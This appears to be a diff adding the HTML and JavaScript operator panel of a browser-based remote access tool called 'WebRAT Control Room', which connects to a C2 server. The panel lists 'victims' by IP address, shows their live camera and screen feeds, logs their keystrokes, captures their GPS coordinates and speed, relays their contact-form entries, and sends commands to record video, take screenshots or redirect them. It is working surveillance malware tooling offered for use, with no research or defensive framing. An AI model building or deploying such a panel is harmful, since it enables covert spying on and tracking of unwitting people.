@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebRAT Surveillance Dashboard</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0d0d0d;
+            color: #00ff41;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            text-transform: uppercase;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+        }
+
+        .container {
+            display: flex;
+            gap: 20px;
+        }
+
+        .sidebar {
+            width: 300px;
+            border-right: 1px solid #333;
+            padding-right: 20px;
+        }
+
+        .main-view {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .victim-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .victim-item {
+            padding: 10px;
+            border: 1px solid #333;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .victim-item:hover {
+            background: #1a1a1a;
+            border-color: #00ff41;
+        }
+
+        .stream-container {
+            position: relative;
+            width: 100%;
+            max-width: 900px;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+        }
+
+        #video-feed {
+            width: 100%;
+            aspect-ratio: 16/9;
+            display: block;
+            object-fit: contain;
+        }
+
+        .live-badge {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: #ff0000;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 10px rgba(255, 0, 0, 0.4);
+            z-index: 10;
+        }
+
+        .live-badge::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .stream-info {
+            background: #1a1a1a;
+            padding: 15px 20px;
+            border-top: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-pill {
+            background: rgba(0, 255, 65, 0.1);
+            color: #00ff41;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            width: 100%;
+            max-width: 900px;
+        }
+
+        button {
+            background: #252525;
+            color: #fff;
+            border: 1px solid #333;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:hover {
+            background: #333;
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        button.primary {
+            background: #cc0000;
+            border-color: #cc0000;
+        }
+
+        button.primary:hover {
+            background: #ff0000;
+            border-color: #ff0000;
+            color: white;
+        }
+
+        .log-panel {
+            margin-top: 0;
+            /* Adjusted from original */
+            width: 100%;
+            height: 150px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            padding: 10px;
+            font-size: 12px;
+            border-radius: 8px;
+            /* Added */
+            max-width: 900px;
+            /* Added */
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            border-bottom: 1px solid #111;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 992px) {
+            body { padding: 10px; }
+            .container {
+                flex-direction: column;
+            }
+
+            .sidebar {
+                width: 100%;
+                border-right: none;
+                border-bottom: 1px solid #333;
+                padding-right: 0;
+                padding-bottom: 15px;
+                margin-bottom: 15px;
+            }
+
+            .main-view {
+                width: 100%;
+            }
+
+            .stream-container,
+            .controls,
+            .log-panel,
+            #victim-info {
+                max-width: 100%;
+            }
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.1rem;
+                padding-bottom: 5px;
+            }
+
+            .controls {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+            }
+
+            button {
+                padding: 10px 5px;
+                font-size: 10px;
+                flex-direction: column;
+                text-align: center;
+                gap: 4px;
+            }
+
+            button i { font-size: 14px; }
+
+            .stream-info {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+                padding: 10px;
+            }
+
+            #target-id-display { font-size: 14px; }
+            #target-meta { font-size: 9px; }
+
+            .log-panel {
+                height: 120px;
+                font-size: 11px;
+            }
+
+            #victim-info div {
+                grid-template-columns: 1fr;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <h1><span style="color: #ff0000;">●</span> WebRAT Control Room</h1>
+    <div class="container">
+        <div class="sidebar">
+            <h3>Online Targets</h3>
+            <ul class="victim-list" id="victim-list">
+                <li class="victim-item" id="no-victims">Scanning for signals...</li>
+            </ul>
+        </div>
+        <div class="main-view">
+            <div class="stream-container">
+                <div class="live-badge">LIVE</div>
+                <img id="video-feed" src="" alt="NO SIGNAL">
+                <div class="stream-info">
+                    <div>
+                        <span id="target-id-display" style="font-weight: bold;">SELECT A TARGET</span>
+                        <div id="target-meta" style="font-size: 11px; color: #888; margin-top: 4px;">No active session
+                        </div>
+                    </div>
+                    <div class="status-pill" id="latency-display">Latency: --ms</div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button class="primary" onclick="sendCommand('screenshot')">
+                    CAPTURE FRAME
+                </button>
+                <button onclick="sendCommand('start_video')" style="border-color: #00ff41; color: #00ff41;">
+                    REQUEST CAMERA
+                </button>
+                <button onclick="sendCommand('stop_video')" style="border-color: #ff0000; color: #ff9999;">
+                    STOP CAMERA
+                </button>
+                <button onclick="sendCommand('switch_camera')">SWITCH CAMERA</button>
+                <button onclick="sendCommand('start_recording')" style="border-color: #cc0000; color: #ff9999;">🔴 REC
+                    VIDEO</button>
+                <button onclick="sendCommand('stop_recording')">⏹ STOP REC</button>
+                <button onclick="sendCommand('start_screenshare')" style="border-color: #00c6fb; color: #99eeff;">💻 REQ
+                    SCREEN</button>
+                <button onclick="sendCommand('get_location')"
+                    style="border-color: #e8eaed; color: #8ab4f8;">📍 LOCATION ACCESS</button>
+                <button onclick="sendCommand('redirect')" style="border-color: #ffcc00; color: #ffeb3b;">
+                    REDIRECT TARGET
+                </button>
+                <button onclick="sendCommand('alert')">SEND MESSAGE</button>
+            </div>
+
+            <div id="victim-info"
+                style="background: #111; padding: 15px; border-radius: 8px; border: 1px solid #333; font-size: 13px; width: 100%; max-width: 900px;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <div>IP ADDR: <span id="target-ip" style="color: #00ff41;">--</span></div>
+                    <div>COORDS: <span id="target-location" style="color: #00ff41;">--</span></div>
+                </div>
+            </div>
+
+            <div class="log-panel" id="logs">
+                <div class="log-entry" style="color: #888;">[SYSTEM] Ready for uplink.</div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script>
+        const socket = io({
+            query: { type: 'surveillance' },
+            transports: ['polling', 'websocket']
+        });
+
+        socket.on('connect_error', (err) => {
+            log(`Connection Error: ${err.message}. Try disabling Brave Shields.`);
+        });
+        let currentTarget = null;
+        let victims = new Map();
+        let lastFrameTime = Date.now();
+        const logPanel = document.getElementById('logs');
+        const videoFeed = document.getElementById('video-feed');
+        const victimList = document.getElementById('victim-list');
+        const noVictimsMsg = document.getElementById('no-victims');
+
+        function log(msg) {
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span style="color: #444;">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            logPanel.prepend(entry);
+        }
+
+        let watchdogTimer = null;
+
+        function resetWatchdog() {
+            if (watchdogTimer) clearTimeout(watchdogTimer);
+            updateSignalStatus('ACTIVE', '#00ff41');
+            watchdogTimer = setTimeout(() => {
+                updateSignalStatus('SIGNAL LOST', '#ff0000');
+                log('<span style="color: #ff0000;">[!] SIGNAL LOST: Target idle for >30s</span>');
+            }, 30000); // 30-second watchdog
+        }
+
+        function updateSignalStatus(text, color) {
+            const display = document.getElementById('latency-display');
+            display.style.backgroundColor = color === '#ff0000' ? 'rgba(255,0,0,0.2)' : 'rgba(0,0,0,0.3)';
+            display.style.color = color;
+            // We append the status if it's not already Active
+            if (text !== 'ACTIVE') {
+                display.innerText = text;
+            }
+        }
+
+        socket.on('video_frame', (data) => {
+            if (!victims.has(data.sid)) addVictim(data.sid, 'Unknown');
+            // Auto-select if no target (or if we lost the previous one)
+            if (!currentTarget) selectTarget(data.sid);
+
+            if (data.sid === currentTarget) {
+                resetWatchdog();
+                videoFeed.src = data.data;
+                const now = Date.now();
+                const latency = now - lastFrameTime;
+
+                // Update live metrics
+                const signalStrength = calculateSignalStrength(latency);
+                let stats = `Latency: ${latency}ms | Signal: ${signalStrength}`;
+                document.getElementById('latency-display').innerText = stats;
+
+                // Update specific session timer
+                if (victims.has(data.sid)) {
+                    const v = victims.get(data.sid);
+                    const duration = Math.floor((Date.now() - v.connectedAt) / 1000);
+                    const hours = Math.floor(duration / 3600).toString().padStart(2, '0');
+                    const minutes = Math.floor((duration % 3600) / 60).toString().padStart(2, '0');
+                    const seconds = (duration % 60).toString().padStart(2, '0');
+                    document.getElementById('target-meta').innerText = `CONNECTED FROM ${v.ip || 'Unknown'} | DURATION: ${hours}:${minutes}:${seconds} | PROTOCOL: WS-ENCRYPTED`;
+                }
+
+                lastFrameTime = now;
+            }
+        });
+
+        // Helper for Signal Strength
+        function calculateSignalStrength(latency) {
+            if (latency < 100) return '🟢 Excellent (5/5)';
+            if (latency < 200) return '🟢 Good (4/5)';
+            if (latency < 500) return '🟡 Fair (3/5)';
+            if (latency < 1000) return '🟠 Poor (2/5)';
+            return '🔴 Critical (1/5)';
+        }
+
+        socket.on('contact_data', (data) => {
+            log(`<span style="color: #bf5af2; font-weight: bold;">[CONTACT FORM]</span> <b>${data.name}</b> (${data.email}): ${data.message}`);
+            // Force focus on logs if important
+        });
+
+        socket.on('keystroke_update', (data) => {
+            const sid = data.sid.substring(0, 6).toUpperCase();
+            const logEntry = document.getElementById(`keys-${data.sid}`);
+
+            if (data.key === 'Enter') {
+                log(`[KEYLOG] ${sid} pressed ENTER in <${data.target}>`);
+            } else if (data.key.length === 1) {
+                // Buffer keystrokes to prevent log spam? 
+                // For now, just log them concisely
+                console.log(`Key from ${sid}: ${data.key}`);
+            }
+        });
+
+        socket.on('log_update', (data) => {
+            if (data.sid === currentTarget) {
+                resetWatchdog();
+                if (data.msg.includes('[HEARTBEAT]')) return; // Don't spam heartbeat logs
+                log(data.msg);
+            }
+        });
+
+        socket.on('connect', () => {
+            log('Link established with C2 Server');
+            socket.emit('force_sync');
+        });
+
+        socket.on('victim_list_sync', (list) => {
+            list.forEach(v => addVictim(v.sid, v.ip));
+        });
+
+        socket.on('victim_connected', (data) => {
+            log(`NEW CONNECTION: ${data.sid} (${data.ip || 'Unknown'})`);
+            addVictim(data.sid, data.ip);
+        });
+
+        socket.on('victim_disconnected', (data) => {
+            log(`SIGNAL LOST: ${data.sid}`);
+            removeVictim(data.sid);
+        });
+
+        socket.on('surveillance_snapshot', (data) => {
+            if (!victims.has(data.sid)) addVictim(data.sid, 'Unknown');
+            log(`Snapshot received from ${data.sid.substring(0, 6)}`);
+        });
+
+        socket.on('location_update', (data) => {
+            const sid = data.sid;
+            const loc = data.data; // The raw data object
+
+            // Store location in victim map
+            if (!victims.has(sid)) addVictim(sid, loc.ip || 'Unknown');
+            const v = victims.get(sid);
+
+            if (v) {
+                // LOGIC CHANGE: Prioritize GPS
+                // If we already have high-accuracy GPS data, ignore low-accuracy IP data
+                if (v.location && v.location.gps && !loc.gps) {
+                    return;
+                }
+                v.location = loc;
+            }
+
+            // Update IP in list if we just got it
+            if (loc.ip && (v.ip === 'Unknown' || !v.ip)) {
+                v.ip = loc.ip;
+                const el = document.getElementById(`v-${sid}`);
+                if (el) el.querySelector('div:last-child').innerText = loc.ip;
+            }
+
+            // Update Display if this is the current target
+            if (sid === currentTarget) {
+                const lat = loc.lat ? loc.lat.toFixed(5) : '--';
+                const lon = loc.lon ? loc.lon.toFixed(5) : '--';
+                const acc = loc.accuracy ? `±${Math.round(loc.accuracy)}m` : '';
+
+                // Source Indicator
+                const sourceTag = loc.gps
+                    ? '<span style="color: #00ff41; font-weight: bold; border: 1px solid #00ff41; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; margin-right: 8px;">GPS PRECISE</span>'
+                    : '<span style="color: #ffcc00; font-weight: bold; border: 1px solid #ffcc00; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; margin-right: 8px;">IP APPROX</span>';
+
+                let locHTML = `<div style="margin-bottom: 6px;">${sourceTag}</div>
+                <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" style="color: #00ff41; text-decoration: none;">
+                    <i class="fa-solid fa-location-crosshairs"></i> ${lat}, ${lon} <span style="font-size: 0.8em; color: #888;">${acc}</span>
+                </a>`;
+
+                // Add extended GPS data if available
+                if (loc.speed !== undefined && loc.speed !== null) {
+                    const speedKmph = (loc.speed * 3.6).toFixed(1); // m/s to km/h
+                    locHTML += `<div style="margin-top: 4px; font-size: 0.85em; color: #00c6fb;">
+                        SPEED: ${speedKmph} km/h | HEAD: ${loc.heading || 0}° | ALT: ${loc.altitude ? Math.round(loc.altitude) + 'm' : '--'}
+                    </div>`;
+                }
+
+                document.getElementById('target-location').innerHTML = locHTML;
+                if (loc.ip) document.getElementById('target-ip').innerText = loc.ip;
+
+                if (loc.gps) {
+                    log(`[GPS] High precision update from ${sid.substring(0, 6)}`);
+                }
+            }
+        });
+
+        socket.on('log_update', (data) => log(`[REMOTE]: ${data.msg}`));
+
+        function selectTarget(sid) {
+            currentTarget = sid;
+            // Clear audio queue on switch
+            // Audio cleanup removed
+
+            const data = victims.get(sid) || { ip: 'Unknown', sid };
+            document.getElementById('target-id-display').innerText = `TARGET: ${sid.substring(0, 8).toUpperCase()}`;
+            document.getElementById('target-ip').innerText = data.ip;
+
+            // Restore location info if we have it
+            if (data.location) {
+                // Trigger a fake update to refresh the UI with stored data
+                socket.emit('force_display_refresh'); // Not needed really, just manual refresh
+                // We can just call the handler logic manually or wait for next update
+                // Simpler: Just clear it for now until next update or persist it better.
+                // Ideally we'd separate the UI update function. 
+            } else {
+                document.getElementById('target-location').innerText = 'Waiting for fix...';
+            }
+
+            document.getElementById('target-meta').innerText = `CONNECTED FROM ${data.ip} | PROTOCOL: WS-ENCRYPTED`;
+
+            document.querySelectorAll('.victim-item').forEach(el => {
+                el.style.borderColor = '#333';
+                el.style.background = 'transparent';
+            });
+            const active = document.getElementById(`v-${sid}`);
+            if (active) {
+                active.style.borderColor = '#00ff41';
+                active.style.background = 'rgba(0, 255, 65, 0.05)';
+            }
+            log(`Uplink established with ${sid.substring(0, 6)}`);
+        }
+
+        function addVictim(sid, ip) {
+            if (victims.has(sid)) return;
+            victims.set(sid, { ip, sid, connectedAt: Date.now() });
+            if (noVictimsMsg) noVictimsMsg.style.display = 'none';
+            const li = document.createElement('li');
+            li.className = 'victim-item';
+            li.id = `v-${sid}`;
+            li.innerHTML = `<div style="font-weight: bold;">NODE ${sid.substring(0, 6).toUpperCase()}</div><div style="font-size: 10px; color: #666;">${ip}</div>`;
+            li.onclick = () => selectTarget(sid);
+            victimList.appendChild(li);
+            if (!currentTarget) selectTarget(sid);
+        }
+
+        function removeVictim(sid) {
+            victims.delete(sid);
+            const el = document.getElementById(`v-${sid}`);
+            if (el) el.remove();
+            if (currentTarget === sid) {
+                currentTarget = null;
+                videoFeed.src = '';
+                // Audio cleanup removed
+                document.getElementById('target-id-display').innerText = 'SIGNAL LOST';
+                document.getElementById('latency-display').innerText = 'Latency: --ms';
+            }
+            if (victims.size === 0 && noVictimsMsg) noVictimsMsg.style.display = 'block';
+        }
+
+        function sendCommand(type) {
+            if (!currentTarget) return log('Error: No target selected');
+            let payload = { type, command: type, target_sid: currentTarget };
+            if (type === 'alert') payload.msg = prompt("Enter alert message:");
+            if (type === 'redirect') payload.url = prompt("Enter redirect URL:");
+            if (payload.msg === null || payload.url === null) return;
+            socket.emit('remote_command', payload);
+            log(`Command dispatched: ${type.toUpperCase()}`);
+        }
+    </script>
+    </script>
+</body>
+
+</html>
